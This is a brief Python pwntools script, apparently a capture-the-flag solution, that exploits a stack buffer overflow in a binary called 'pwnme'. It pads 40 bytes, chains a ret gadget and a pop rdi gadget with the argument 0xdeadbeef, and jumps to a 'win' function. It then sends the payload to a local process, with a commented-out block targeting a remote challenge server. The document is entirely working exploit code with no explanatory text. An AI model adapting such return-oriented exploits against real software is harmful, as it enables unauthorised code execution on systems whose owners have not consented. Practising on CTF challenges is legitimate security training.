#!/usr/bin/python3

from pwn import *

e = ELF('./pwnme')
offset = 40

return_address = e.symbols['win']
ret = 0x40101a
pop_rdi = 0x401253

payload = offset * b'A'
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(0xdeadbeef)
payload += p64(return_address)

p = process('./pwnme')
p.sendline(payload)
p.interactive()
'''
conn = remote('0.cloud.chals.io',28949)
conn.sendline(payload)
conn.interactive()
'''


